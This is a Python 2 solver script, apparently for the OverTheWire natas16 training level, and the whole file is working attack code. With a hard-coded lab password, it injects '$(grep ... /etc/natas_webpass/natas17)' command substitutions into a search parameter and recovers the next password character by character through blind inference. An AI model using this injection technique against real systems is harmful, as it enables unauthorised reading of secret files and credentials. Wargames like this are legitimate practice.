import string

import requests
from requests.auth import HTTPBasicAuth

HOST = 'http://natas16.natas.labs.overthewire.org/index.php'
auth = HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')


def true(resp):
    return 'zucchini' not in resp


def query(key):
    query.numreq += 1
    print 'sending {0}'.format(key)
    params = dict(needle=key)
    return requests.get(HOST, params=params, auth=auth)
query.numreq = 0


def get_char_linear_search(prefix):
    for c in string.ascii_letters + string.digits:
        key = r'$(grep -E ^{0}{1}.* /etc/natas_webpass/natas17)zucchini'.format(prefix, c)
        r = query(key)
        if true(r.content):
            print '\tchar found: {0}'.format(c)
            return c

    else:
        return None


def get_char_binary_search(prefix):
    key = r'$(grep -E ^{0}{1}.* /etc/natas_webpass/natas17)zucchini'

    def get_char_class(prefix):
        classes = [('[a-z]', string.ascii_lowercase),
                   ('[A-Z]', string.ascii_uppercase),
                   ('[0-9]', string.digits)]

        for regex, arr in classes:
            if true(query(key.format(prefix, regex)).content):
                return arr
        else:
            return None

    arr = get_char_class(prefix)
    if not arr:
        return None
    print '\tclass for prefix {0}: {1}'.format(prefix, ''.join(arr))

    left = 0
    right = len(arr) - 1
    pivot = (left + right) / 2

    while left <= right:
        if true(query(key.format(prefix, arr[pivot])).content):
            print '\tchar found: {0}'.format(arr[pivot])
            return arr[pivot]

        if true(query(key.format(prefix, '[{0}-{1}]'.format(arr[pivot], arr[right]))).content):
            left = pivot + 1
            pivot = (left + right) / 2

        else:
            right = pivot - 1
            pivot = (left + right) / 2

    return None


def get_password(f):
    pw = []

    while 1:
        c = f(''.join(pw))
        if c:
            pw.append(c)
        else:
            break

    return pw, query.numreq


if __name__ == '__main__':
    pw_binary, qn_binary = get_password(get_char_binary_search)
    query.numreq = 0
    pw_linear, qn_linear = get_password(get_char_linear_search)

    print 'found password: {0} via {1} using {2} requests'.format(''.join(pw_binary), get_char_binary_search, qn_binary)
    print 'found password: {0} via {1} using {2} requests'.format(''.join(pw_linear), get_char_linear_search, qn_linear)
    assert pw_binary == pw_linear
